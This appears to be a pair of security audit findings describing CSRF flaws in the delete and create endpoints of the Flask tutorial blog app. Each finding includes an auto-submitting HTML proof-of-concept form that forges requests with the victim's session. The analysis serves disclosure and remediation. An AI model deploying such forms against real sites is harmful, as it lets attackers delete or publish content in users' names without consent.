title: Cross-Site Request Forgery (CSRF) in Post Deletion Endpoint
analysis:
The `delete` view in `examples/tutorial/flaskr/blog.py` is vulnerable to Cross-Site Request Forgery (CSRF). 

- **Source**: Untrusted HTTP POST request directed to `/<int:id>/delete` initiated by a third-party webpage visited by an authenticated user. The user's session cookie is automatically included with the request by the browser.
- **Sanitization/Validation**: The `@login_required` decorator checks that `g.user` is present in the session, and `get_post(id)` verifies that the post exists and belongs to `g.user['id']`. However, there is no CSRF token generation, transmission, or validation anywhere in the form submission or endpoint processing, nor is there any check against the `Origin` or `Referer` headers. Furthermore, Flask's default cookie configuration does not enforce `SameSite=Strict` or `SameSite=Lax`.
- **Sink**: The deletion query `db.execute("DELETE FROM post WHERE id = ?", (id,))` commits the deletion of the victim's post from the database.

**Conceptual Exploit Payload**:
An attacker hosts an HTML page containing an auto-submitting form:
```html
<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://target-flaskr-app:5000/1/delete" method="POST">
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```
When an authenticated author visits the attacker's page, the browser automatically sends a POST request with the author's session cookie to `/1/delete`, causing post ID 1 to be deleted without the author's knowledge or consent.

title: Cross-Site Request Forgery (CSRF) in Post Creation Endpoint
analysis:
The `create` view in `examples/tutorial/flaskr/blog.py` is vulnerable to Cross-Site Request Forgery (CSRF).

- **Source**: Untrusted HTTP POST request directed to `/create` initiated by an external site visited by an authenticated user. The user's session cookie is automatically included with the request by the browser.
- **Sanitization/Validation**: The `@login_required` decorator checks that `g.user` is present in the session, and input values for `title` and `body` are read from `request.form`. However, there is no CSRF token check, anti-forgery header check, or Origin/Referer verification.
- **Sink**: The insert statement `db.execute("INSERT INTO post (title, body, author_id) VALUES (?, ?, ?)", (title, body, g.user["id"]))` executes and commits a new blog post attributed to the victim user.

**Conceptual Exploit Payload**:
An attacker hosts an HTML page containing an auto-submitting form:
```html
<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://target-flaskr-app:5000/create" method="POST">
      <input type="hidden" name="title" value="Compromised Post Title" />
      <input type="hidden" name="body" value="This post was forged via CSRF." />
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```
When an authenticated user visits the attacker's page, the browser automatically sends a POST request with the user's session cookie to `/create`, publishing an unauthorized blog post under the victim's name.
